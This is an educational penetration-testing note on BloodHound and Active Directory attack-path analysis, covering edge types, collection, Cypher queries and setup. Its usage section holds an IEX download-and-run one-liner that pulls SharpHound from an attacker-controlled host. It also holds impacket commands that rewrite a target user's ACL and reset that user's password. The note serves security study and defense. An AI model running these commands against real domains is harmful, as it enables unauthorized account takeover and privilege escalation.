# 📌 BloodHound & Attack Path Analysis

> Graph-based AD attack path mapper — turns a massive, opaque domain into a visual roadmap straight to Domain Admin.

---

## 🔍 Definition

BloodHound is an open-source Active Directory (and Entra ID) enumeration and attack path analysis tool built by SpecterOps. It collects AD relationship data (users, groups, computers, ACLs, sessions, trusts) and uses **graph theory** to reveal the shortest and least-obvious paths from a low-priv user to Domain Admin. Indispensable for both red teams and blue teams. As of 2025, **BloodHound v8.0** introduced **OpenGraph**, extending coverage to GitHub, Okta, Jamf, and other identity platforms.

---

## 🧠 Core Concepts

- **Nodes** — objects in AD: users, groups, computers, OUs, GPOs, domains
- **Edges** — relationships between nodes: `MemberOf`, `GenericAll`, `WriteDACL`, `HasSession`, `AdminTo`, `DCSync`, `CanRDP`, etc.
- **Attack Path** — a chain of edges from a low-priv node to a high-value target (e.g., Domain Admins)
- **SharpHound** — the C# data collector (ingestor) that runs in the target AD environment and outputs JSON files for BloodHound
- **bloodhound-python** — Python ingestor, runs from Kali without domain join. Needs valid creds
- **Neo4j** — the graph database backend BloodHound uses to store and query data
- **Cypher** — Neo4j's query language. Used to write custom BloodHound queries
- **Tier Zero assets** — highest-value nodes: Domain Controllers, `krbtgt`, Domain Admins group, ADCS CAs, etc.
- **BloodHound CE (Community Edition)** — free, self-hosted version. Replaced the old GUI in 2023
- **BloodHound Enterprise** — SaaS version by SpecterOps with continuous APM, integrations with Okta, GitHub, Mac (Jamf), etc.
- **OpenGraph** — new framework in v8.0 allowing custom collectors for any identity platform beyond AD

---

## ⚙️ How It Works

1. **Collection phase** — run SharpHound or bloodhound-python in the target domain. It queries LDAP, SMB, and RPC to gather:
   - All users, groups, computers, OUs, GPOs
   - ACLs on every object (who has GenericAll, WriteDACL, etc.)
   - Active sessions (who is logged into which machine)
   - Domain trusts
   - AD CS data (if `-c All` or `--collect All` is used)
2. **Import** — upload the JSON/ZIP files into BloodHound GUI
3. **Analysis** — BloodHound builds a graph. Run built-in queries or write custom Cypher queries
4. **Path discovery** — use "Shortest Paths to Domain Admins" or similar to see the chain of nodes and edges between you and DA

> 💡 The real power isn't the obvious paths — it's finding that `john.doe` has `WriteDACL` on the `IT Helpdesk` group, which has `GenericAll` on `svc_backup`, which has `DCSync` rights. Without BloodHound, you'd never spot that chain manually.

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| GenericAll | Full control over an object — can reset password, modify attributes, add to groups |
| GenericWrite | Write to non-protected attributes — can set SPNs (→ Kerberoast), logon scripts |
| WriteDACL | Can modify the object's ACL — can grant yourself GenericAll |
| WriteOwner | Can take ownership of the object — can then grant yourself permissions |
| ForceChangePassword | Can reset a user's password without knowing the current one |
| AddMember | Can add members to a group |
| DCSync | Has replication rights on the domain object — can dump all hashes |
| AllowedToDelegate | Can impersonate users to specific services (constrained delegation) |
| AllowedToAct | RBCD — resource-based constrained delegation abuse |
| HasSession | A user has an active session on a computer (can steal their token/hash if local admin) |
| AdminTo | Account has local admin on a computer |
| CanRDP | Account can RDP to a computer |

---

## 🔥 Important Details & Gotchas

- **Session data is time-sensitive** — BloodHound only captures sessions that were active at collection time. Re-run SharpHound during business hours to get the best session data
- **ACL abuse is non-obvious but devastating** — many paths to DA don't involve passwords at all, just `WriteDACL` → grant yourself `GenericAll` → reset password → done
- **BloodHound CE (2023+) is NOT backward-compatible** with old BloodHound data or queries — if using Certipy's BloodHound output, use the `-old-bloodhound` flag or the CE-compatible fork
- **Custom Cypher queries massively expand BloodHound** — Compass Security released updated CE queries in January 2025 covering AD CS paths, GPO abuse, and more
- **BloodHound sees ACLs on the domain object itself** — so you can find users with WriteDACL on the domain, which means they can grant themselves DCSync rights
- **"Owned" nodes** — mark compromised nodes as owned in BloodHound, then use "Shortest Paths from Owned Principals" to see your actual attack surface from your current position
- **BloodHound doesn't exploit anything** — it's purely analysis. Once you find a path, you still need to execute it manually or with other tools

---

## 🌍 Real-World Usage / Examples

**Collection from Kali (bloodhound-python):**
```bash
bloodhound-python -u user -p pass -d corp.local -ns <DC-IP> -c All
# Outputs: corp.local_computers.json, users.json, groups.json, etc.
# Import the zip into BloodHound GUI
```

**Collection from Windows (SharpHound):**
```powershell
.\SharpHound.exe -c All --outputdirectory C:\temp
# Or via IEX for in-memory execution:
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All
```

**Key built-in queries to run first:**
```
Find All Domain Admins
Find Shortest Paths to Domain Admins
Find Principals with DCSync Rights
Find Computers with Unconstrained Delegation
Find Kerberoastable Users (High Value)
Shortest Paths from Owned Principals to Domain Admins
Find Transitive Object Control (ACL abuse paths)
```

**ACL abuse path (WriteDACL → GenericAll → Password Reset):**
```bash
# 1. BloodHound shows: lowprivuser -[WriteDACL]-> TargetUser

# 2. Add GenericAll to yourself via DACL modification
impacket-dacledit -action write -rights FullControl -principal lowprivuser -target TargetUser corp.local/lowprivuser:pass

# 3. Reset TargetUser's password
impacket-changepasswd corp.local/lowprivuser:pass@<DC-IP> -newpasswd 'NewP@ss123!' -altuser TargetUser -altpass ''
```

**Cypher query examples:**
```cypher
// Find users with WriteDACL on DA group
MATCH p=(u:User)-[:WriteDACL]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN p

// Find all Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.description

// Nodes with path to DA under 4 hops
MATCH p=shortestPath((u:User)-[*1..4]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
```

---

## 🛠️ Setup (BloodHound CE on Kali)

```bash
# Install via Docker
docker pull specterops/bloodhound-ce
docker compose up

# Or use the pre-packaged bloodhound-python ingestor
pip3 install bloodhound
```

---

## 🔗 Related Topics

- [[Active Directory (AD)]]
- [[Kerberos Authentication]]
- [[NTLM and Pass-the-Hash]]
- [[AD Certificate Services (AD CS)]]
- [[Lateral Movement]]
- [[Privilege Escalation - Windows]]
- [[LDAP Enumeration]]

---

## 📚 Sources / Further Reading

- [BloodHound Official Docs](https://bloodhound.specterops.io/get-started/introduction) — authoritative
- [SpecterOps Blog](https://posts.specterops.io) — cutting-edge research by the BloodHound team
- [Compass Security CE Custom Queries (Jan 2025)](https://blog.compass-security.com/2025/01/bloodhound-community-edition-custom-queries/) — extended query pack
- [Evolve Security — BloodHound Overview](https://www.evolvesecurity.com/blog-posts/tools-of-the-trade-tracking-security-misconfigurations-with-bloodhound) — practical usage
- HTB Academy — "Active Directory BloodHound" module
- HTB Machines: `Forest`, `Cascade`, `Resolute`
